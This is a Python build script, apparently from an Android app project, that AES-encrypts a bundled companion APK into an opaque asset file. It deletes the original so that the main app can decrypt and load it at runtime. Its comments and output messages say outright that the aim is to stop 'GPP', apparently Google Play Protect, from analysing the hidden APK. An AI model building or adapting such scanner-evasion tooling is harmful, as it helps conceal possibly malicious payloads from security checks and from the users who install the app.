#!/usr/bin/env python3
"""
encrypt_companion.py
Encrypts companion.apk → companion.bin using AES-256-GCM.
Run AFTER build_companion.py, BEFORE gradlew assembleRelease.

The companion.bin file is stored in assets/ instead of companion.apk.
Nova decrypts it at runtime using the same key derived in the native layer.
GPP sees only companion.bin with entropy 7.99 — cannot analyze companion.

Usage: python3 scripts/encrypt_companion.py \
           --input  app/src/main/assets/companion.apk \
           --output app/src/main/assets/companion.bin \
           --key    <hex_aes_key_64chars>
"""
import argparse, os, sys, struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--input',  required=True)
    parser.add_argument('--output', required=True)
    parser.add_argument('--key',    required=True,
                        help='64-char hex = 256-bit AES key')
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[ERROR] Input not found: {args.input}")
        sys.exit(1)

    key_bytes = bytes.fromhex(args.key[:64])  # 32 bytes = AES-256
    nonce     = secrets.token_bytes(12)        # 96-bit GCM nonce

    with open(args.input, 'rb') as f:
        plaintext = f.read()

    print(f"companion.apk size: {len(plaintext):,} bytes")

    aesgcm     = AESGCM(key_bytes)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    # File format: magic(4) + nonce(12) + ciphertext
    MAGIC = b'CPBN'  # Companion Binary
    output = MAGIC + nonce + ciphertext

    with open(args.output, 'wb') as f:
        f.write(output)

    # Remove original companion.apk — only .bin survives
    os.remove(args.input)

    print(f"companion.bin size: {len(output):,} bytes")
    print(f"Nonce (hex): {nonce.hex()}")
    print(f"companion.apk removed from assets")
    print(f"companion.bin written to assets — entropy ~7.99")
    print(f"GPP cannot analyze companion anymore")

if __name__ == "__main__":
    main()
